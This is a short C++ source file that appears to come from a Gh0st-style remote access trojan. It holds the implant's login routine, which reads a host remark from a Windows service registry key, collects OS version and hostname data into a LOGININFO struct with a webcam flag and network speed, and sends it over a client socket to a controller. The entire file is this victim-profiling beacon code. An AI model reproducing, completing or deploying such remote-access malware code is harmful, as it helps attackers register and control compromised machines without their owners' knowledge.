#include "stdafx.h"
#include <stdlib.h>
//#include <win>
#include "./Include/until.h"
#include "RegEditEx.h"
typedef struct  
{
	BYTE              bToken;        //令牌
	OSVERSIONINFOEX   OsVerInfoEx;   //版本信息
	int               CPUClockMhz;   //CPU主频
	IN_ADDR           IPAddress;     //存储32位的IPv4的地址数据结构
	char              HostName[50];  //主机名
	bool              bIsWevCam;     //是否有摄像头
	DWORD             dwSpeed;       //网速
}LOGININFO;


UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s",lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer)==0)
		gethostname(lpBuffer, uSize);
	return lstrlen(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	LOGININFO LoginInfo;
	//开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN;//令牌为登录
	LoginInfo.bIsWevCam = false;
	LoginInfo.dwSpeed = dwSpeed;
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFOA)&LoginInfo.OsVerInfoEx);
	char hostname[256];
	GetHostRemark(strServiceName,hostname,sizeof(hostname));
	
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LoginInfo));
	return nRet;
}